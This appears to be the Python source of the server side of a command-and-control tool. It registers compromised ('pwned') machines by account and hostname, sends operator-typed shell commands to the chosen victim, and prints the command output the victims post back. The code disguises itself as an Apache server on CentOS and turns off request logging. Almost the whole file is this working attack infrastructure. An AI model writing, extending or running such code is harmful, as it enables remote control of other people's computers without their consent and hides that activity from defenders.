from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore
from urllib.parse import unquote_plus

#Constants Variables Imports
from settings import PORT, CMD_REQUEST, RESPONSE, RESPONSE_KEY, BIND_ADDR

class C2Handler(BaseHTTPRequestHandler):
    """This class is a child of the BaseHTTPRequestHandler class.
	It handles all http requests arrived from the client
	"""
 
    #Make our Server look like an Up-to-date Apache2 Server on CentOS
    server_version = "Apache/4.6.2"
    sys_version = "(CentOS)"
    
    def do_GET(self):
        """this method handles all http GET Requests arrived at the C2 server.
        first send 404 status codes"""
        
        global activeSession, clientAccount, clientHostname, pwnedId, pwnedDict
        
        if self.path.startswith(CMD_REQUEST):
            client = self.path.split(CMD_REQUEST)[1]
            clientIp = self.client_address[0]

            # Split out the client Account Name
            clientAccount = client.split("@")[0]

            # Split out the client Host Name
            clientHostname = client.split("@")[1]

            # Check the client is existing in pwnedDict
            if client not in pwnedDict.values():
                # Send http Response code and header back to a client
                self.http_response(404)
                
                # Increment pwnedId and add the client to pwnedDict using pwnedId as Dict
                pwnedId += 1
                pwnedDict[pwnedId] = client

                # Print Pwned Client Message & Information
                # print(Fore.LIGHTBLUE_EX+f"[+] User Account:
                # {clientAccount} from {clientHostname} has been pwned by C2 Server "
                # + Fore.RESET)
                print(Fore.LIGHTGREEN_EX+f"[+] {clientAccount}@{clientHostname}({clientIp}) has been Pwned \n"+Fore.RESET)
            
            # If the client in pwnedDict and also is Active Session    
            elif client == pwnedDict[activeSession]:
                # Collect Command from input to run on the client
                command = input(Fore.RESET+f"{clientAccount}@{clientHostname}({clientIp}) > "+Fore.LIGHTYELLOW_EX)
                print(Fore.RESET)

                # Send 200 status codes Write the Command back to the client as a Response; must use UTF-8 for encoding
                try:
                    # Send HTTP Response Code and Header back to the client
                    self.http_response(200)
                    
                    # Write the Command back to the client as a Response; must use UTF-8 for encoding
                    self.wfile.write(command.encode())
                except BrokenPipeError:
                    # Print lost connection message
                    print(Fore.RED + f"[!] Lost Connection to {pwnedDict[activeSession]}. \n" + Fore.RESET)

                    # Delete Lost Connection Client from pwnedDict
                    del pwnedDict[activeSession]

                    # If pwnedDict is empty, Re initialize pwnedId & activeSession
                    if not pwnedDict:
                        print(Fore.LIGHTBLUE_EX+ "[...] Waiting for a new Connection!" + Fore.RESET)
                        pwnedId = 0
                        activeSession = 1
                    # if pwnedDict have items, print it on display to choose active session and switch to it
                    else:
                        #display sessions in our dictionary and choose one of them to switch over to
                        while True:
                            print(*pwnedDict.items(), sep='\n')
                            try:
                                newSession = int(input("\n[+] Choose Session Number to Make it Active => "))
                            except ValueError:
                                print(Fore.LIGHTRED_EX + "\n[-] Enter Number Only; You must choose a pwned ID of "
                                                         "one of the sessions show on the Screen\n" + Fore.RESET)
                                continue
                            # Ensure entered pwnedId exists in pwnedDict and set activeSession to it
                            if newSession in pwnedDict:
                                activeSession = newSession
                                print(Fore.LIGHTGREEN_EX + f"[+] Active Session has been Set on: "
                                                          f"{pwnedDict[activeSession]}\n" + Fore.RESET)
                                break
                            # if newSession not in pwnedDict actually wrong chosen number
                            else:
                                print(Fore.LIGHTRED_EX + "\nWrong Choose; You must choose a pwned ID of one "
                                      "of the sessions show on the Screen\n")
                                continue

                # Handle KeyboardInterrupt
                except KeyboardInterrupt:
                    print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Server"+Fore.RESET)
                    exit()
                # Handle Unknown & Other Errors
                except Exception as e:
                    print(Fore.LIGHTRED_EX+"[!] Unknown Error when Sending Command to C2 Client\n"+Fore.RESET)
                    print(f'Error Content:\n{e}')    
            
            # if client in the pwnedDict but is Not Active Session
            else:
                # Send HTTP Response Code and Header back to the client
                self.http_response(404)
                
    def do_POST(self):
        """this method handles all http POST Requests arrived at the C2 server."""
        
        # Follow code when compromised Computer requesting command
        if self.path == RESPONSE:
            # Send http Response code and header back to the client
            self.http_response(200)


            # Get Content Length value from http headers
            contentLength = int(self.headers.get('Content-Length')) # noqa
            
            # gather the client's data by reading in the HTTP POST data
            clientData = self.rfile.read(contentLength)
            # Decode clientData
            clientData = clientData.decode()
            
            # Remove the HTTP Post Variable and the equal sign from the client's data
            clientData = clientData.replace(f"{RESPONSE_KEY}=", "", 1)
            
            #HTML/URL decode the Clients data(stdout) and translate "+" to a Space
            clientData = unquote_plus(clientData)
            
            #Print Result of stdout arrived from the client in Plain Text format
            print(clientData)  


    def http_response(self, code: int):
        """this function sends the HTTP Response codes
		and Headers back to the client"""
        self.send_response(code)
        self.end_headers()
    
    def log_request(self, code="-", size="-"):
        """Override this function because by default these functions write to screen,
        but we need and want to write logs into a file
        """
        return


# maps to the clients we have a prompt from that 
activeSession = 1

# this is accounts from the client belonging to Active Sessions
clientAccount = ""

# this is a hostname from client belonging to Active Sessions
clientHostname = ""

# Use to count and track each client connecting to C2 Servers(pwned by C2 Server)
pwnedId = 0

#Track all pwned clients; key = pwned_id and value is unique from each client.
# value follow this pattern => (account@hostname@epoch time)
pwnedDict = {}

# Instance from HTTP Server
# noinspection PyTypeChecker
server = HTTPServer((BIND_ADDR, PORT), C2Handler)

# Print C2 Server Side Message for avoid complexing in test operation
print(Fore.LIGHTMAGENTA_EX+"[+]-------------C2 Server Side-------------[+]\nWait for new Connection...\n"+Fore.RESET)
#Run Server in infinity Loop
server.serve_forever()
